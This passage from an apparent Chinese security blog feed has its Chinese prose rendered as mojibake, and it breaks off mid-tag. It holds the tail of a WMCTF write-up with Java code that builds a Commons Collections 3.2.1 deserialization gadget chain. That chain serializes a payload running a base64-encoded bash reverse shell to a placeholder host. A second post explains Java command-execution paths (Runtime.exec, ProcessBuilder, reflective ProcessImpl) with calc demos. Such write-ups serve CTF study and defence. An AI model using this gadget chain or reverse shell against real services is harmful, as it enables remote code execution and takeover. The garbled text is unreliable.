System.out.println(base64Encode(bytes1));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ä»»æ„ç¬¦åˆCC3.2.1çš„CCé“¾</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getEvilCode</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//åå¼¹shell</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eC85NTAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//éšä¾¿è®¾ç½®ä¸€ä¸ªå€¼ï¼Œé˜²æ­¢åé¢å†æ‰§è¡Œputæ–¹æ³•çš„æ—¶å€™è°ƒç”¨é“¾å­</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;useless&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry, <span class="string">&quot;def&quot;</span>);</span><br><span class="line">        <span class="comment">//ä¿®æ”¹ä¸ºHashSetè°ƒç”¨readObjectæ–¹æ³•</span></span><br><span class="line">        HashSet&lt;Object&gt; hashSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        setField(hashSet, <span class="string">&quot;map&quot;</span>, hashMap2);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹LazyMapçš„factoryå±æ€§ï¼Œä¿®æ”¹ä¸ºé“¾å­çš„ååŠæ®µ</span></span><br><span class="line">        setField(lazyMap, <span class="string">&quot;factory&quot;</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashSet);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Str</span> <span class="operator">=</span> base64Encode(bytes1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> base64Str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pPLgz01"><img src="https://z1.ax1x.com/2023/10/02/pPLgz01.png" alt="pPLgz01.png"></a></p><h2 id="Traveller"><a href="#Traveller" class="headerlink" title="Traveller"></a>Traveller</h2><p>TODO</p><h2 id="ez-challenge"><a href="#ez-challenge" class="headerlink" title="ez_challenge"></a>ez_challenge</h2><p>TODO</p>]]></content>
      
      
      <categories>
          
          <category> competition </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wmctf </tag>
            
            <tag> ä¸»ä»å¤åˆ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2023/07/10/%E6%B5%85%E8%B0%88Java%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/07/10/%E6%B5%85%E8%B0%88Java%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ"><a href="#æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ"></a>æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ</h1><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112410425.png" alt="image-20230715112410425"></p><h2 id="å¸¸è§åˆ©ç”¨æ–¹å¼"><a href="#å¸¸è§åˆ©ç”¨æ–¹å¼" class="headerlink" title="å¸¸è§åˆ©ç”¨æ–¹å¼"></a>å¸¸è§åˆ©ç”¨æ–¹å¼</h2><p><strong>Runtime.exec()</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeExecTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        exec1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec1</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;notepad&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec2</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd /c calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec3</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd.exe /k calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec4</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cmd /c echo echo_test &gt; echo.txt&quot;</span>).getInputStream();</span><br><span class="line">        <span class="type">byte</span>[] res = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        is.read(res);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(res));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>java.lang.ProcessBuilder</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessBuilderTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">start</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>java.lang.ProcessImpl</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessImplTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">start</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        start.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        start.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>javax.script.ScriptEngineManager</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScriptEngineManagerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ScriptException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Runtime-exec"><a href="#Runtime-exec" class="headerlink" title="Runtime.exec()"></a>Runtime.exec()</h2><p>exec()æ–¹æ³•å¸¦æœ‰å¤šç§é‡è½½æ–¹æ³•ï¼Œenvpä¸ºç¯å¢ƒï¼Œdirä¸ºç›®å½•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command)</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp)</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp, File dir)</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String cmdarray[])</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp)</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span><br></pre></td></tr></table></figure><p>ä¼ å…¥å½¢å¼ä¸ºStringå’ŒString[]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cmd1</span> <span class="operator">=</span> <span class="string">&quot;/bin/sh -c whoami&quot;</span>;</span><br><span class="line">String[] cmd2 = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›ä¼ å…¥Stringçš„exec()è¿›è¡Œè°ƒè¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> exec(command, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥æ”¶String commandåè°ƒç”¨<code>public Process exec(String command, String[] envp, File dir)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp, File dir)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (command.length() == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Empty command&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringTokenizer</span> <span class="variable">st</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(command);</span><br><span class="line">    String[] cmdarray = <span class="keyword">new</span> <span class="title class_">String</span>[st.countTokens()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; st.hasMoreTokens(); i++)</span><br><span class="line">        cmdarray[i] = st.nextToken();</span><br><span class="line">    <span class="keyword">return</span> exec(cmdarray, envp, dir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éšåString commandç»è¿‡StringTokenizerç±»å®ä¾‹åå˜æˆ<code>String[] cmdarray</code></p><p>è·Ÿè¿›StringTokenizer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">StringTokenizer</span><span class="params">(String str)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>(str, <span class="string">&quot; \t\n\r\f&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">StringTokenizer</span><span class="params">(String str, String delim, <span class="type">boolean</span> returnDelims)</span> &#123;</span><br><span class="line">    currentPosition = <span class="number">0</span>;</span><br><span class="line">    newPosition = -<span class="number">1</span>;</span><br><span class="line">    delimsChanged = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.str = str;</span><br><span class="line">    maxPosition = str.length();</span><br><span class="line">    delimiters = delim;</span><br><span class="line">    retDelims = returnDelims;</span><br><span class="line">    setMaxDelimCodePoint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ·»åŠ <code>ç©ºæ ¼ã€tabã€å›è½¦æ¢è¡Œã€æ¢è¡Œã€æ¢é¡µç¬¦</code>ä¸ºåˆ†éš”ç¬¦ï¼Œå°†ä¼ å…¥çš„ command åˆ†å‰²ï¼Œè·å¾—æœ€ç»ˆçš„String[]ï¼Œå‘ç°æœ¬è´¨è¿˜æ˜¯è¦è½¬æ¢ä¸ºString[]æ¥è¿›è¡Œå‘½ä»¤çš„è°ƒç”¨ï¼Œæœ€åè°ƒç”¨<code>public Process exec(String[] cmdarray, String[] envp, File dir)</code>æ‰§è¡Œå‘½ä»¤</p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112422117.png" alt="image-20230715112422117"></p><p><code>public Process exec(String[] cmdarray, String[] envp, File dir)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdarray)</span><br><span class="line">        .environment(envp)</span><br><span class="line">        .directory(dir)</span><br><span class="line">        .start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å®ä¾‹åŒ– ProcessBuilder æ¥å¤„ç†ä¼ å…¥çš„ cmdarrayã€‚è¯´æ˜Runtime.getRuntime.exec()çš„åº•å±‚å®é™…ä¸Šæ˜¯ProcessBuilderã€‚åˆ°è¿™é‡Œæœ€å¤–å±‚çš„execçš„è°ƒç”¨å°±ç»“æŸäº†ï¼Œä¸‹é¢å°±æ˜¯<code>ProcessBuilder</code>çš„è°ƒç”¨äº†</p><h2 id="ProcessBuilder-start"><a href="#ProcessBuilder-start" class="headerlink" title="ProcessBuilder.start()"></a>ProcessBuilder.start()</h2><p>å¯ä»¥ç›´æ¥ç”¨<code>ProcessBuilder.start()</code>æ¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] cmd = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls&quot;</span>&#125;;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream();</span><br></pre></td></tr></table></figure><p><strong>java.lang.ProcessBuilder#start</strong></p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112432705.png" alt="image-20230715112432705"></p><p>è¿™é‡Œå°†<code>cmdarray[0]</code>èµ‹å€¼ç»™<code>prog</code>ï¼Œéšååˆ¤æ–­securityæ˜¯å¦ä¸ºnullï¼Œå¦‚æœSecurityManagerå¼€å¯,ä¼šè°ƒç”¨SecurityManager#checkExec()å¯¹æ‰§è¡Œç¨‹åºprogè¿›è¡Œæ£€æŸ¥ï¼Œç„¶åè°ƒç”¨<code>java.lang.ProcessImpl#start</code></p><h2 id="ProcessImpl-start"><a href="#ProcessImpl-start" class="headerlink" title="ProcessImpl.start()"></a>ProcessImpl.start()</h2><p>ProcessImplä¸ºæ›´ä¸‹é¢ä¸€å±‚ï¼ŒRuntimeå’ŒProcessBuilderæ‰§è¡Œå‘½ä»¤å®é™…ä¸Šæœ€åæ˜¯è°ƒç”¨ProcessImplè¿™ä¸ªç±»ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦ä½¿ç”¨åå°„çš„æ–¹å¼æ¥è°ƒç”¨ProcessImplç±»ä»è€Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">start</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="type">boolean</span>.class);</span><br><span class="line">start.setAccessible(<span class="literal">true</span>);</span><br><span class="line">start.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p><code>java.lang.ProcessImpl#start</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Process <span class="title function_">start</span><span class="params">(String cmdarray[],</span></span><br><span class="line"><span class="params">                     java.util.Map&lt;String,String&gt; environment,</span></span><br><span class="line"><span class="params">                     String dir,</span></span><br><span class="line"><span class="params">                     ProcessBuilder.Redirect[] redirects,</span></span><br><span class="line"><span class="params">                     <span class="type">boolean</span> redirectErrorStream)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br></pre></td></tr></table></figure><p>ä¸‹é¢åˆ†ä¸¤ç§æƒ…å†µï¼ŒWindows ä¼šè°ƒç”¨ ProcessImpl ç±»çš„æ„é€ æ–¹æ³•ï¼ŒLinux ä¼šè°ƒç”¨ java.lang.UNIXProcess#init&lt;&gt; ã€‚</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><strong>ProcessImpl</strong></p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112438609.png" alt="image-20230715112438609"></p><p>å…¶ä¸­<code>allowAmbiguousCommands</code>ä¸º â€œæ˜¯å¦å…è®¸è°ƒç”¨æœ¬åœ°è¿›ç¨‹â€ ï¼Œé»˜è®¤ä¸ºfalseï¼Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶æ‰èƒ½ç½®ä¸ºtrueï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.security == null</span><br><span class="line">2.jdk.lang.Process.allowAmbiguousCommandsä¸ºtrue</span><br></pre></td></tr></table></figure><p>éšåè°ƒç”¨needsEscaping()å¯¹progä½¿ç”¨quoteString()è¿›è¡Œå¤„ç†ï¼Œç„¶åè°ƒç”¨createCommandLine()å°†å‘½ä»¤æ•°ç»„æ‹¼æ¥ä¸ºå‘½ä»¤å­—ç¬¦ä¸²ï¼Œæœ€åè°ƒç”¨create()åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ã€‚</p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112444839.png" alt="image-20230715112444839"></p><p>ç»è¿‡ä¸Šé¢å¤„ç†åè°ƒç”¨<code>ProcessImpl#create()</code>ï¼Œå…¶ä¸ºä¸€ä¸ªnativeæ–¹æ³•ï¼Œä¼šå»è°ƒç”¨åˆ°xxxx.c è¿›è¡Œå¤„ç†ï¼Œæœ€åè°ƒç”¨Windowsç³»ç»ŸAPIå‡½æ•°ï¼šCreateProcessW()ï¼Œç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„Windowsè¿›ç¨‹ã€‚éšåå°†æ–°è¿›ç¨‹çš„å¥æŸ„è¿”å›ç»™ProcessImpl#create()</p><p><img src="D:\bokelocalpost\assert\æµ…è°ˆJavaä¸‹çš„å‘½ä»¤æ‰§è¡Œ\image-20230715112450381.png" 